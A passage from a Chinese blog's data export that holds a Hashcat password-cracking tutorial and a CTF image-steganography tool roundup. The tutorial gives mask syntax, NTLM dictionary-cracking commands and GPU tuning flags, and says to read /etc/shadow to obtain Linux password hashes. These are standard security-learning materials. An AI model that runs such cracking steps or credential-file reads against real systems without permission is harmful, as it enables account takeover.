class=\"line\">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class=\"line\">7 | Hybrid Mask + Wordlist  混合掩码 + 字典</span><br><span class=\"line\">9 | Association</span><br></pre></td></tr></table></figure>\n\n<p>需要注意上面的1、6和7的组合是如下描述</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-17-41-2022-09-03-16-15-13-image.png\" class=\"\">\n\n<p>-m hash加密的类型，最常用为0系MD5加密，默认是MD5类型</p>\n<p>当我们想要找一个类型在hashcat支不支持的时候，可以使用</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-18-20-2022-09-04-12-01-12-image.png\" class=\"\">\n\n<p>windows系统加密的是NTML，可以看到NTLM的ID号为1000，则使用 -m 1000</p>\n<p>-o 将输出结果储存到指定文件  <code> -o outfile.txt</code></p>\n<p>-O 大写，启用优化的内核（限制密码长度）</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-19-21-2022-09-04-12-07-49-image.png\" class=\"\">\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">l | abcdefghijklmnopqrstuvwxyz              纯小写字母</span><br><span class=\"line\">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母</span><br><span class=\"line\">d | 0123456789                              纯数字</span><br><span class=\"line\">h | 0123456789abcdef                        十六进制小写字母和数字</span><br><span class=\"line\">H | 0123456789ABCDEF                        十六进制大写字母和数字</span><br><span class=\"line\">s |  !&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~       特殊字符</span><br><span class=\"line\">a | ?l?u?d?s                                键盘上所有可见的字符</span><br><span class=\"line\">b | 0x00 - 0xff                             匹配密码空格</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">八位数字密码：?d?d?d?d?d?d?d?d</span><br><span class=\"line\">八位未知密码：?a?a?a?a?a?a?a?a</span><br><span class=\"line\">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span><br><span class=\"line\">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span><br><span class=\"line\">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span><br><span class=\"line\">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d</span><br><span class=\"line\">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--custom-charset1 [chars]等价于 -1</span><br><span class=\"line\">--custom-charset2 [chars]等价于 -2</span><br><span class=\"line\">--custom-charset3 [chars]等价于 -3</span><br><span class=\"line\">--custom-charset4 [chars]等价于 -4</span><br></pre></td></tr></table></figure>\n\n<p>自定义掩码规则，在掩码中用 ?1、?2、?3、?4 来表示。</p>\n<p>注意：</p>\n<ul>\n<li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li>\n<li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li>\n</ul>\n<p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，如上图，首先我们知道密码有多少位，例如:<code>?d?d?d?d?d</code>代表密码为5为数字，<code>?u?l?l?l?l?d?d?d123</code>代表密码为11位，首个字母大写，后面为123。</p>\n<p><strong>使用字典爆破windows hash</strong><br><code>hashcat -a 0 -m 1000 hash或者hashfile 字典文件 --force</code></p>\n<p>在破解后，会在根目录下的<code>~/.hashcat/hashcat.potfile</code>文件记录这个hash的缓存,可以删除文件里对应的记录。最好将该文件清空，方便后续破解。</p>\n<p>如上图，-D参数指定opencl的设备类型，即CPU还是GPU，虚拟机不支持GPU。GPU破解需要安装显卡对应的驱动，如果电脑有英伟达（NVIDIA RTX&#x2F;GTX）的独显，可以使用CUDA加速，需要提前安装cuda，这里可以直接使用docker容器。</p>\n<p>一般使用 -D 2 指定 GPU 破解</p>\n<p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p>\n<p><mark>Hashcat 参数优化</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--gpu-accel 160         可以让GPU发挥最大性能</span><br><span class=\"line\">--gpu-loops 1024        可以让GPU发挥最大性能</span><br><span class=\"line\">--segment-size 512      可以提高大字典破解的速度</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-20-12-2022-09-04-12-32-40-image.png\" class=\"\">\n\n<p>在linux中，我们知道，密码分别存储在&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可，Linux使用的是 sha512crypt加密方式</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-20-41-2022-09-04-13-31-26-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-21-06-2022-09-04-13-36-40-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-21-28-2022-09-04-13-37-36-image.png\" class=\"\">\n\n<p><mark>基本使用方式 </mark></p>\n<p>hashcat -m 哈希类型 -a 攻击类型 –force hash文件&#x2F;字符串 字典&#x2F;掩码</p>\n<p>s键查看破解进度，p键暂停，r键继续破解，q键退出破解</p>\n","excerpt":"","more":"<h2 id=\"Hashcat使用教程\"><a href=\"#Hashcat使用教程\" class=\"headerlink\" title=\"Hashcat使用教程\"></a>Hashcat使用教程</h2><p>Hashcat系列有3个版本，分别是hashcat、 oclhashcat-lite和oclhashcat-plus.<br>其中hashcat是利用CPU来暴力破解密码的，支持的算法是最多的，但是相比破解速度很慢。<br>oclhashcat-lite和oclhashcat-plus都是利用GPU来破解密码的，破解速度比利用CPU的hashcat快很多倍。<br>oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。<br><mark>以上是对于windows来说的。</mark></p>\n<p>对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用–increment参数，并且用–increment-min ? 定义最短长度，使用–increment-max ? 定义最大长度。比如要尝试6-8位小写字母，可以这样写</p>\n<p><code>--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</code></p>\n<p>不指定字符类型则是</p>\n<p><code>--increment --increment-min 6 --increment-max 8</code></p>\n<p>linux系统可以通过 cat &#x2F;etc&#x2F;shadow 获取哈希值</p>\n<p>hashcat是一款可以基于显卡暴力破解密码的工具</p>\n<p><strong><strong>-a 攻击方式</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 | Straight  字典破解</span><br><span class=\"line\">1 | Combination  组合破解</span><br><span class=\"line\">3 | Brute-force  掩码破解</span><br><span class=\"line\">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class=\"line\">7 | Hybrid Mask + Wordlist  混合掩码 + 字典</span><br><span class=\"line\">9 | Association</span><br></pre></td></tr></table></figure>\n\n<p>需要注意上面的1、6和7的组合是如下描述</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-17-41-2022-09-03-16-15-13-image.png\" class=\"\">\n\n<p>-m hash加密的类型，最常用为0系MD5加密，默认是MD5类型</p>\n<p>当我们想要找一个类型在hashcat支不支持的时候，可以使用</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-18-20-2022-09-04-12-01-12-image.png\" class=\"\">\n\n<p>windows系统加密的是NTML，可以看到NTLM的ID号为1000，则使用 -m 1000</p>\n<p>-o 将输出结果储存到指定文件  <code> -o outfile.txt</code></p>\n<p>-O 大写，启用优化的内核（限制密码长度）</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-19-21-2022-09-04-12-07-49-image.png\" class=\"\">\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">l | abcdefghijklmnopqrstuvwxyz              纯小写字母</span><br><span class=\"line\">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ              纯大写字母</span><br><span class=\"line\">d | 0123456789                              纯数字</span><br><span class=\"line\">h | 0123456789abcdef                        十六进制小写字母和数字</span><br><span class=\"line\">H | 0123456789ABCDEF                        十六进制大写字母和数字</span><br><span class=\"line\">s |  !&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~       特殊字符</span><br><span class=\"line\">a | ?l?u?d?s                                键盘上所有可见的字符</span><br><span class=\"line\">b | 0x00 - 0xff                             匹配密码空格</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">八位数字密码：?d?d?d?d?d?d?d?d</span><br><span class=\"line\">八位未知密码：?a?a?a?a?a?a?a?a</span><br><span class=\"line\">前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d</span><br><span class=\"line\">前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H</span><br><span class=\"line\">前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</span><br><span class=\"line\">6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d</span><br><span class=\"line\">6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--custom-charset1 [chars]等价于 -1</span><br><span class=\"line\">--custom-charset2 [chars]等价于 -2</span><br><span class=\"line\">--custom-charset3 [chars]等价于 -3</span><br><span class=\"line\">--custom-charset4 [chars]等价于 -4</span><br></pre></td></tr></table></figure>\n\n<p>自定义掩码规则，在掩码中用 ?1、?2、?3、?4 来表示。</p>\n<p>注意：</p>\n<ul>\n<li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li>\n<li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li>\n</ul>\n<p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，如上图，首先我们知道密码有多少位，例如:<code>?d?d?d?d?d</code>代表密码为5为数字，<code>?u?l?l?l?l?d?d?d123</code>代表密码为11位，首个字母大写，后面为123。</p>\n<p><strong>使用字典爆破windows hash</strong><br><code>hashcat -a 0 -m 1000 hash或者hashfile 字典文件 --force</code></p>\n<p>在破解后，会在根目录下的<code>~/.hashcat/hashcat.potfile</code>文件记录这个hash的缓存,可以删除文件里对应的记录。最好将该文件清空，方便后续破解。</p>\n<p>如上图，-D参数指定opencl的设备类型，即CPU还是GPU，虚拟机不支持GPU。GPU破解需要安装显卡对应的驱动，如果电脑有英伟达（NVIDIA RTX&#x2F;GTX）的独显，可以使用CUDA加速，需要提前安装cuda，这里可以直接使用docker容器。</p>\n<p>一般使用 -D 2 指定 GPU 破解</p>\n<p>在使用GPU模式进行破解时，可以使用 -O 参数自动进行优化</p>\n<p><mark>Hashcat 参数优化</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--gpu-accel 160         可以让GPU发挥最大性能</span><br><span class=\"line\">--gpu-loops 1024        可以让GPU发挥最大性能</span><br><span class=\"line\">--segment-size 512      可以提高大字典破解的速度</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-20-12-2022-09-04-12-32-40-image.png\" class=\"\">\n\n<p>在linux中，我们知道，密码分别存储在&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可，Linux使用的是 sha512crypt加密方式</p>\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-20-41-2022-09-04-13-31-26-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-21-06-2022-09-04-13-36-40-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/Hashcat%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2022-12-21-15-21-28-2022-09-04-13-37-36-image.png\" class=\"\">\n\n<p><mark>基本使用方式 </mark></p>\n<p>hashcat -m 哈希类型 -a 攻击类型 –force hash文件&#x2F;字符串 字典&#x2F;掩码</p>\n<p>s键查看破解进度，p键暂停，r键继续破解，q键退出破解</p>\n"},{"title":"CTF-图片隐写那些事儿","date":"2024-11-15T13:26:39.000Z","_content":"\n# CTF-图片隐写那些事儿\n\n## 1 steghide\n\n分为windows和linux两个版本，（jpg隐藏信息）\n\nSteghide是一种隐写程序，能够隐藏各种图像和音频文件中的数据。颜色方面的样本频率不会更改，主要是对jpg文件。\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-43-28-image.png)\n\nsteghide-0.5.1-win32.zip   已下载软件及其版本\n\n以下是kali下使用方法：\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-46-30-image.png)\n\nsteghide爆破密码：\n\n> 有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：[GitHub - Va5c0/Steghide-Brute-Force-Tool](https://github.com/Va5c0/Steghide-Brute-Force-Tool)\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-47-55-image.png)\n\n## 2 stegdetect\n\nStegdetect主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息（PS：我没用过）\nStegdetect通过统计测试来分析图像文件中是否包含隐藏内容；运行静态测试以判断隐藏的内容是否存在；尝试识别隐藏内容是通过哪个隐写工具嵌入的。\n\nkali安装命令\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-08-09-image.png)\n\n使用方法：\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-35-46-image.png)![](CTF-图片隐写那些事儿/2022-11-27-12-38-47-image.png)\n\n## 3 outguess\n\nOutGuess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-50-13-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-50-30-image.png)\n\n没有密码的则kali下使用\n\noutguess -r avatar.jpg -t 1.txt\n\n## 4 Stegsolve\n\n一款ctf中常用的图形化工具，需要安装java环境，破解LSB算法、隐藏二维码等\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-02-32-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-03-20-image.png)\n\n青少年CTF训练赛--光头强小分队2\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-12-09-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-16-21-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-16-48-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-24-18-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-30-42-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-12-16-image.png)\n\n先做反转再添加1，同样能达到上面程序执行的效果：\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-11-44-image.png)\n\n## 5 F5-steganography\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-19-26-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-19-48-image.png)\n\n## 6 Jphswin\n\n一款图形化界面的JPHS隐写工具 [下载地址](https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w)（提取码：n9ao）\n导入图片，加密就点hide输入密码（也可不用密码）然后save一下就好了，解密就点seek输入密码（也可能没密码）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-33-35-image.png)\n\n## 7 Zsteg（lsb隐写）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-35-01-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-35-47-image.png)\n\n## 8 BlindWaterMark\n\n盲水印脚本-python\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-38-22-image.png)\n\n更多参考[CTF-图片隐写那些事儿 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2069964)\n\n## 9 silenteye隐写\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-39-52-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-41-18-image.png)\n\n## 10 exiftool（查看图片exif信息）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-42-49-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-43-01-image.png)\n\n## 11 pngcheck （检查IDAT块_win）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-49-16-image.png)\n\n## 12 WebP（webp文件操作）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-52-50-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-53-19-image.png)\n\n## 13 stegpy（支持多种文件加密）\n\n此种加密支持对PNG、BMP、GIF、WebP和WAV格式加密，同时可以选择有无password\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-07-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-28-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-46-image.png)\n\n用于解青少年CTF训练赛--光头强小分队2\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-56-16-image.png)\n\n更多音视频隐写请：[Misc工具（22.7.6更） - Ga1@xy's W0r1d](http://www.ga1axy.top/index.php/archives/6/#12pngbmp)\n","source":"_posts/CTF-图片隐写那些事儿.md","raw":"---\ntitle: CTF-图片隐写那些事儿\ndate: 2024-11-15 21:26:39\ntags: [misc]\n\n---\n\n# CTF-图片隐写那些事儿\n\n## 1 steghide\n\n分为windows和linux两个版本，（jpg隐藏信息）\n\nSteghide是一种隐写程序，能够隐藏各种图像和音频文件中的数据。颜色方面的样本频率不会更改，主要是对jpg文件。\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-43-28-image.png)\n\nsteghide-0.5.1-win32.zip   已下载软件及其版本\n\n以下是kali下使用方法：\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-46-30-image.png)\n\nsteghide爆破密码：\n\n> 有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：[GitHub - Va5c0/Steghide-Brute-Force-Tool](https://github.com/Va5c0/Steghide-Brute-Force-Tool)\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-47-55-image.png)\n\n## 2 stegdetect\n\nStegdetect主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息（PS：我没用过）\nStegdetect通过统计测试来分析图像文件中是否包含隐藏内容；运行静态测试以判断隐藏的内容是否存在；尝试识别隐藏内容是通过哪个隐写工具嵌入的。\n\nkali安装命令\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-08-09-image.png)\n\n使用方法：\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-35-46-image.png)![](CTF-图片隐写那些事儿/2022-11-27-12-38-47-image.png)\n\n## 3 outguess\n\nOutGuess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-50-13-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-27-11-50-30-image.png)\n\n没有密码的则kali下使用\n\noutguess -r avatar.jpg -t 1.txt\n\n## 4 Stegsolve\n\n一款ctf中常用的图形化工具，需要安装java环境，破解LSB算法、隐藏二维码等\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-02-32-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-27-12-03-20-image.png)\n\n青少年CTF训练赛--光头强小分队2\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-12-09-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-16-21-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-16-48-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-24-18-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-00-30-42-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-12-16-image.png)\n\n先做反转再添加1，同样能达到上面程序执行的效果：\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-11-44-image.png)\n\n## 5 F5-steganography\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-19-26-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-19-48-image.png)\n\n## 6 Jphswin\n\n一款图形化界面的JPHS隐写工具 [下载地址](https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w)（提取码：n9ao）\n导入图片，加密就点hide输入密码（也可不用密码）然后save一下就好了，解密就点seek输入密码（也可能没密码）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-33-35-image.png)\n\n## 7 Zsteg（lsb隐写）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-35-01-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-35-47-image.png)\n\n## 8 BlindWaterMark\n\n盲水印脚本-python\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-38-22-image.png)\n\n更多参考[CTF-图片隐写那些事儿 - 腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2069964)\n\n## 9 silenteye隐写\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-39-52-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-41-18-image.png)\n\n## 10 exiftool（查看图片exif信息）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-42-49-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-43-01-image.png)\n\n## 11 pngcheck （检查IDAT块_win）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-49-16-image.png)\n\n## 12 WebP（webp文件操作）\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-52-50-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-53-19-image.png)\n\n## 13 stegpy（支持多种文件加密）\n\n此种加密支持对PNG、BMP、GIF、WebP和WAV格式加密，同时可以选择有无password\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-07-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-28-image.png)\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-55-46-image.png)\n\n用于解青少年CTF训练赛--光头强小分队2\n\n![](CTF-图片隐写那些事儿/2022-11-28-01-56-16-image.png)\n\n更多音视频隐写请：[Misc工具（22.7.6更） - Ga1@xy's W0r1d](http://www.ga1axy.top/index.php/archives/6/#12pngbmp)\n","slug":"CTF-图片隐写那些事儿","published":1,"updated":"2024-11-15T14:14:53.036Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2r00038oi46ydv4dbm","content":"<h1 id=\"CTF-图片隐写那些事儿\"><a href=\"#CTF-图片隐写那些事儿\" class=\"headerlink\" title=\"CTF-图片隐写那些事儿\"></a>CTF-图片隐写那些事儿</h1><h2 id=\"1-steghide\"><a href=\"#1-steghide\" class=\"headerlink\" title=\"1 steghide\"></a>1 steghide</h2><p>分为windows和linux两个版本，（jpg隐藏信息）</p>\n<p>Steghide是一种隐写程序，能够隐藏各种图像和音频文件中的数据。颜色方面的样本频率不会更改，主要是对jpg文件。</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-43-28-image.png\" class=\"\">\n\n<p>steghide-0.5.1-win32.zip   已下载软件及其版本</p>\n<p>以下是kali下使用方法：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-46-30-image.png\" class=\"\">\n\n<p>steghide爆破密码：</p>\n<blockquote>\n<p>有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：<a href=\"https://github.com/Va5c0/Steghide-Brute-Force-Tool\">GitHub - Va5c0&#x2F;Steghide-Brute-Force-Tool</a></p>\n</blockquote>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-47-55-image.png\" class=\"\">\n\n<h2 id=\"2-stegdetect\"><a href=\"#2-stegdetect\" class=\"headerlink\" title=\"2 stegdetect\"></a>2 stegdetect</h2><p>Stegdetect主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息（PS：我没用过）<br>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容；运行静态测试以判断隐藏的内容是否存在；尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p>\n<p>kali安装命令</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-08-09-image.png\" class=\"\">\n\n<p>使用方法：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-35-46-image.png\" class=\"\"><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-38-47-image.png\" class=\"\">\n\n<h2 id=\"3-outguess\"><a href=\"#3-outguess\" class=\"headerlink\" title=\"3 outguess\"></a>3 outguess</h2><p>OutGuess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-50-13-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-50-30-image.png\" class=\"\">\n\n<p>没有密码的则kali下使用</p>\n<p>outguess -r avatar.jpg -t 1.txt</p>\n<h2 id=\"4-Stegsolve\"><a href=\"#4-Stegsolve\" class=\"headerlink\" title=\"4 Stegsolve\"></a>4 Stegsolve</h2><p>一款ctf中常用的图形化工具，需要安装java环境，破解LSB算法、隐藏二维码等</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-02-32-image.png\" class=\"\">\n\n<img 